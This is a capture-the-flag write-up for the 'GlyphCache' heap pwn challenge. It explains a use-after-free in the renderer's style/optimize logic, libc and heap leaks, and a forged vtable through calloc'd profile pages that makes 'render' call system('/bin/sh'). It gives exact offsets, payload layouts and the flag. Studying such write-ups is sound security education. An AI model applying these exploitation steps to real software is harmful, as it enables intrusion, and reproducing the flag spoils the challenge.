# GlyphCache

> **Category**: Pwn
>
> **Flag**: `LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}`

> **Challenge:** GlyphCache (pwn / heap) **Target:** `nc 15.235.202.47 9001` **Files:** `chall`, `libc.so.6`, `ld-linux-x86-64.so.2`, `run.sh`&#x20;

A headless "glyph renderer" with a command shell (`load`, `style`, `layout`, `paint`, `optimize`, `profile add`, `inspect paint raw`, `render`, …).

***

### 1. Triage

```
Arch:       amd64-64-little
RELRO:      Full RELRO      (no GOT overwrite)
Stack:      Canary found
NX:         NX enabled       (need ROP / funcptr)
PIE:        PIE enabled      (need a leak)
FORTIFY:    Enabled
Stripped:   No               (symbols present: main, kSafeFilter, gE, ...)
libc:       glibc with __free_hook/__malloc_hook present  (<= 2.33)
```

Key symbols (file offsets):

| symbol               | offset                 | meaning                                                   |
| -------------------- | ---------------------- | --------------------------------------------------------- |
| `main`               | `0x54e0`               | main loop                                                 |
| `gE` (anon-ns state) | `0x32020`              | big BSS struct holding all renderer state                 |
| `kSafeFilter`        | `0x32490` = `gE+0x470` | a static "vtable": `{ magic[8], funcptr[8] }`             |
| `safe_filter`        | `0x6330`               | the function stored in `kSafeFilter`                      |
| `fill_style`         | `0x6360`               | writes a `CompatStyle` (paint buffer)                     |
| `rebuild_style`      | `0x63d0`               | allocates style entries                                   |
| `reset`              | `0x6550`               | frees + zeroes `gE[0..0x470]` (but **not** `kSafeFilter`) |

`gE` layout (offsets relative to `gE`):

```
0x000  DOM text buffer (0xf0 bytes, what `load` writes)
0x0f8  text length
0x100  layout flag (word)
0x101  layout-done flag
0x102  paint-cache-valid flag          <-- gates inspect/render
0x110  style epoch counter
0x118  layout epoch
0x128  layout hash                     <-- compared vs 0x130 to decide cache hit
0x130  paint's recorded layout hash
0x138  style table: N entries x 0x28 bytes
       per entry: { ptr0(0x430), ptr1(0x20), ptr2(0x430), ptr3(0x20),
                    +0x20 active_flag, +0x21 freed_flag }
0x3c0  node_idx (which style entry paint uses)
0x3d0  paint text len, 0x3d8 paint text ptr
0x3d8  = gE  (paint text always points at the DOM buffer)
0x3e0  paint_buffer pointer  (-> a 0x430 malloc chunk = CompatStyle)
0x3e8  profile page pointer array (16 x 8)
0x468  profile page count
0x470  kSafeFilter { u64 magic="GYPHFLIF", u64 funcptr=safe_filter }
```

CompatStyle (the paint buffer, 0x50 bytes shown by `inspect`):

```
+0x00  [gE+0x110]   (style epoch)
+0x08  1
+0x10  kSafeFilter  (PIE pointer)   <-- render dereferences this as a vtable
+0x18  rodata 0x26060
+0x20  "Glyph/<name>"  (snprintf)
```

### 2. The vulnerable code path: `render`

`render` (main+0x75c @ `0x5b76`):

```c
rax = gE->paint_buffer;                 // gE+0x3e0
rcx = *(rax + 0x10);                    // = kSafeFilter normally
if (rcx == 0) { puts("no paint cache"); return; }
if (*(u64*)rcx != 0x46494c4648505947)   // "GYPHFLIF" magic
    { puts("[render] filter missing"); return; }
// copy gE->paint_text (len gE->paint_textlen) into a stack buf
rdi = stack_buf;                        // = "/bin/sh" etc
(*(rcx + 8))(rdi);                      // <-- indirect call: funcptr(text)
```

So if we control either `paint_buffer+0x10` (to point at a fake vtable) **or** `kSafeFilter+8` (the funcptr), and the loaded DOM text is `"/bin/sh"`, a `render` call becomes `system("/bin/sh")`.

### 3. The bug — UAF via the lagging `+0x20` retire flag

`rebuild_style` (called by `style`/`theme`) does this curious dance:

```c
old_node = gE->node_idx;               // 0x3c0
if (old_node >= 0)
    style_table[old_node].active_flag = 1;   // +0x20 = 1  (mark PREVIOUS entry freeable)
// allocate a NEW entry at index = style_count
style_table[style_count] = { malloc(0x430), malloc(0x20),
                             malloc(0x430), malloc(0x20), ... };
gE->node_idx = style_count;            // node_idx now points at the NEW entry
```

i.e. **a style call marks the&#x20;**_**previous**_**&#x20;entry as freeable, not the one it just allocated.** Crucially, `paint_buffer` (gE+0x3e0) still points at the entry `paint` last selected (the one `node_idx` pointed at _before_ the extra `style`), because `rebuild_style` does **not** clear `gE+0x102` when the layout hash is unchanged (it only clears it on a hash mismatch):

```c
if (gE->paint_flag && gE->layout_hash == gE->paint_hash)  // unchanged
    ;                                  // do NOT clear paint flag, do NOT touch paint_buffer
```

So the sequence

```
load /bin/sh
style a            ; entry0 allocated, node_idx=0, +0x20[0]=0
layout
paint              ; paint_buffer = entry0.ptr0 = chunkA0,  gE+0x102=1, gE+0x130=gE+0x128
style b            ; marks entry0.+0x20=1, allocs entry1, node_idx=1
                   ; layout hash unchanged -> paint flag STAYS 1, paint_buffer STAYS chunkA0
optimize           ; free loop: frees entries where +0x20=1 && +0x21=0
                   ; -> frees entry0.ptr0 (chunkA0 == paint_buffer!) and entry0.ptr2 (chunkB0)
                   ; "cache kept" path (epochs equal) does NOT clear gE+0x102
```

leaves `gE+0x3e0` dangling at the **freed** `chunkA0` while `gE+0x102` is still `1`. That is the **use-after-free**: `inspect paint raw` / `render` still operate on the freed chunk.

### 4. Leaks

`inspect paint raw` dumps 0x50 bytes from `gE+0x3e0` (= freed `chunkA0`):

```
+0x00  chunkA0.fd  = main_arena (unsorted-bin head)   -> LIBC leak
+0x08  chunkA0.bk  = chunkB0 header                   -> HEAP leak
+0x10  0
+0x20  "Glyph/a"   (leftover CompatStyle data)
```

* `libc_base = fd - 0x203b20` (constant; verified against `/proc/<pid>/maps`)
* `system = libc_base + 0x58750`
* `chunkB0_user = bk + 0x10` (bk points at chunkB0's _header_; user data is header+0x10)

A pre-UAF `inspect` also gives a PIE leak (`paint_buffer+0x10 == kSafeFilter`), though the exploit doesn't need it.

### 5. Write + hijack

`profile add <hex>` does `calloc(1, 0x430)` and stores the pointer in `gE->profile_pages[count]`. The allocator reuses the two freed 0x440 unsorted chunks **in the order they were freed** (oldest first = `chunkA0`, then `chunkB0`):

| step | command                  | calloc returns               | what we write                            |
| ---- | ------------------------ | ---------------------------- | ---------------------------------------- |
| 1    | `profile add <payload1>` | `chunkA0` (= `paint_buffer`) | `+0x10 = vtable_addr` (= `chunkB0_user`) |
| 2    | `profile add <payload2>` | `chunkB0` (= `vtable_addr`)  | `magic + p64(system)`                    |

`payload1 = b"\x00"*16 + p64(heap_leak + 0x10)` `payload2 = b"GYPHFLIF" + p64(system)`

Then `render`:

```
rcx = paint_buffer[0x10]          == vtable_addr  (chunkB0_user)
*(u64*)rcx                        == "GYPHFLIF"   (magic OK)
rcx[8](rdi = "/bin/sh")           == system("/bin/sh")   -> shell
```

### 6. Reproduce

```bash
# local
cd "Glyph Cache"            # contains chall, libc.so.6, ld-linux-x86-64.so.2
python3 exploit.py

# remote
python3 exploit.py remote
```

Expected:

```
[*] PIE leak (kSafeFilter) = 0x...
[*] libc leak (fd) = 0x...
[*] heap leak (bk = chunkB0 header) = 0x...
[*] libc_base = 0x...
[*] system    = 0x...
[*] profile #1: paint_buffer+0x10 -> 0x...
[*] profile #2: vtable = magic + system
===SHELL===
uid=1001(user) ...
LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
```

### 7. Files

| file                                         | description                                                                                             |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `exploit.py`                                 | final working PoC (local + remote)                                                                      |
| `leak_analysis.py`                           | prints the pre/post-UAF inspect dump + libc/heap offsets                                                |
| `heap_scan_debug.py`                         | scans `/proc/<pid>/mem` to locate where `profile #2` lands (used to derive `vtable = heap_leak + 0x10`) |
| `chall`, `libc.so.6`, `ld-linux-x86-64.so.2` | challenge binaries                                                                                      |

### 8. Flag

```
LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
```
